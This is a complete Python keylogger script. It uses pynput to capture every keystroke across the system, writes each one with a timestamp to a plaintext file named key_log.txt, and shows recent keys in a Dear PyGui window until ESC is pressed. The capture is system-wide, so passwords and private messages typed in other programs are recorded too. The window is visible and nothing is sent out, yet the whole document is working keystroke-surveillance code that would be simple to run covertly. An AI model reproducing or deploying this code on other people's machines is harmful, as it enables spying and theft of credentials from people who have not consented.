from pynput import keyboard
from datetime import datetime
from dearpygui.dearpygui import *
import threading

log_file = "key_log.txt"
log_buffer = []

# GUI update function
def update_display():
    clear_log = ""
    for line in log_buffer[-100:]:  # Show last 100 lines max
        clear_log += line + "\n"
    set_value("log_area", clear_log)

# Listener function running in thread
def keylogger_thread():
    def on_press(key):
        if key == keyboard.Key.esc:
            stop_dearpygui()  # Stop GUI and listener
            return False

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            log_line = f"{timestamp} - {key.char}"
        except AttributeError:
            log_line = f"{timestamp} - [{key}]"

        log_buffer.append(log_line)
        with open(log_file, "a") as f:
            f.write(log_line + '\n')
        
        update_display()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Start listener in background thread
threading.Thread(target=keylogger_thread, daemon=True).start()

# GUI Layout
create_context()
create_viewport(title='Live Keylogger - Dear PyGui', width=700, height=400)

with window(label="Keylogger Output", width=700, height=400):
    add_text("Keystrokes (press ESC to stop):")
    add_input_text(tag = "log_area", multiline=True, readonly=True, height=300, width=650)

setup_dearpygui()
show_viewport()
start_dearpygui()
destroy_context()
